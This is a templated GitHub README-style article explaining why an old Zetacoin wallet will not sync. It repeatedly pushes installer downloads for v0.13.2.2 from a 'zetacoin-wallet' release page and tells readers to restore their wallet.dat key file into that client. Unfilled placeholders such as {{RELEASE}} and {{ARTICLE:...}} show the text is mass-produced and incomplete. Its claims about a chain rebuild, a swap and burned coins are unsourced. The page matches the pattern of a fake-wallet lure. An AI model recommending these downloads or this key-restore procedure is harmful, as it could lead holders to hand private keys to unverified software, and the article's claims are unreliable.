![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Why an Old Zetacoin Wallet Will Not Sync</h1>

<p align="center">What still exists from the retired SHA-256 chain, and what it means for an old balance.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

A wallet that has been closed for years will not sync because it is following the retired SHA-256 chain, or because it is running a build from before the 2021 rebuild. The fix is to back up `wallet.dat`, move the old data directory aside, install the current release, and let the client sync the current chain before restoring the file.

## What you are looking at

A wallet from 2015, opened today, is a client from 2015 pointed at a chain that was replaced. It reports a height far behind, peers that do not answer its protocol, and a sync that never advances.

The message in the client rarely says "wrong chain". It says no block source, or it sits at a percentage and stops, or it connects and disconnects. All of those are the same underlying situation: the software and the network no longer match.

The full walk-through, with the checks in order, is in [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md).

## The two things to separate

There are two separate problems in an old installation, and they need different treatment. The software is obsolete, and the data directory holds chain data from a chain nobody follows.

Replacing the software without touching the data leaves the new client reading old chain files. Moving the data without replacing the software leaves an obsolete client building a chain it does not understand. Both are done in the same order: back up, separate, then install.

## The sequence

1. Open the old wallet if it still runs, and copy `wallet.dat` to an external drive.
2. Close it. Rename the entire data directory so nothing is deleted.
3. Install the current release from {{RELEASE}} and launch it once.
4. Let it create a fresh data directory, then close it.
5. Copy the backed-up `wallet.dat` into the new directory.
6. Reopen and let it sync and rescan.

Renaming rather than deleting is the important detail. If the restore reveals something unexpected, the old folder is still there.

For the background behind this step, [Legacy Zetacoin Z-Address Coins](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/legacy-z-address-coins.md) covers the same ground in more detail.

## The legacy-chain workaround, and why it is not your fix

There is a documented setting that lets a legacy node keep following the old chain, `maxtipage`, which allows a node to accept a tip that old. It is a research tool for the retired chain, not a repair for a current wallet.

Applying it to a current installation makes the client willing to follow old data, which is the opposite of what you want. If a guide suggests it for a sync problem, the guide is about the legacy chain.

## What the rescan will and will not find

If the keys in the old file were migrated in 2021-2022, the current client will find the balance on the current chain after a rescan. That is the good case, and it is common for holders who used the swap.

If the keys were never migrated, the rescan finds nothing, because the coins were burned as unclaimed when the window closed. No tool changes that.

## When the wallet is genuinely lost

An old file that will not open, or a machine that no longer boots, is a recovery problem rather than a sync problem. The disk may still hold the file, and a copy of it is worth making before any repair attempt.

That path is covered in {{ARTICLE:recover-lost-zetacoin-wallet-file}}, and the answer depends entirely on whether a copy exists.

## What to do with the old folder afterwards

Once the new installation is synced and the balance is confirmed, the old folder can be archived or deleted. Keep the old `wallet.dat` as a labelled copy if you want the record.

Do not point the current client at the old folder again, and do not copy the old chain data into the new directory. The current chain is a different chain, and mixing the two reproduces the problem.

## Common questions

### Why does an old wallet never finish syncing?

Because it is following the retired chain with obsolete software. The chain it expects no longer receives blocks from the network it can reach.

### Can I just reinstall over it?

No. Reinstalling leaves the old data directory in place, so the new client reads the same legacy data.

### Will my old coins appear after the update?

Only if they were migrated before August 2022. Otherwise they were burned as unclaimed.

### Does maxtipage fix it?

No. It is a legacy-chain setting and it makes a current wallet willing to follow old data.

## The short version

Back up, rename, install the current client, restore the file, rescan. Old coins appear only if they were migrated.

Related pages: {{ARTICLE:zetacoin-legacy-z-address-coins}} for Z balances, {{ARTICLE:update-zetacoin-wallet-safely}} for the update sequence, {{ARTICLE:restore-zetacoin-wallet-backup}} for the restore, and {{ARTICLE:old-zetacoin-chain-status}} for the retired chain. {{RELEASE}} has the build to install.

## What the client is telling you without saying it

An old client does not know it is old. It connects, exchanges version information with peers, finds that nobody speaks its protocol or follows its chain, and reports the only thing it can: no source of blocks.

From the outside that reads like a network fault, which is why people restart routers and reinstall software that was never going to work. The message is accurate and the diagnosis is wrong.

The tell is the date. If the client predates 2021, the chain it was built for has been replaced, and no amount of connectivity will bring it back into the network.

## Why the data directory matters as much as the binary

Replacing the client while leaving the old data in place produces a new binary reading a retired chain, which is a subtler version of the same problem. The client follows what it finds on disk before it follows what the network offers.

Separating the two is therefore the whole repair: a fresh directory for the current chain, and the wallet file restored into it deliberately. Keeping the old folder renamed rather than deleted means nothing is lost if the restore reveals something unexpected.

{{ARTICLE:zetacoin-wallet-not-syncing-fix}} covers the current-chain version of this symptom, which has entirely different causes.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Is the Old SHA-256 Zetacoin Chain Still Running?](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/is-the-old-sha-256-chain-running.md)
- [What Happened to the Zetacoin Swap](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/what-happened-to-the-swap.md)
- [Legacy Zetacoin Z-Address Coins](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/legacy-z-address-coins.md)
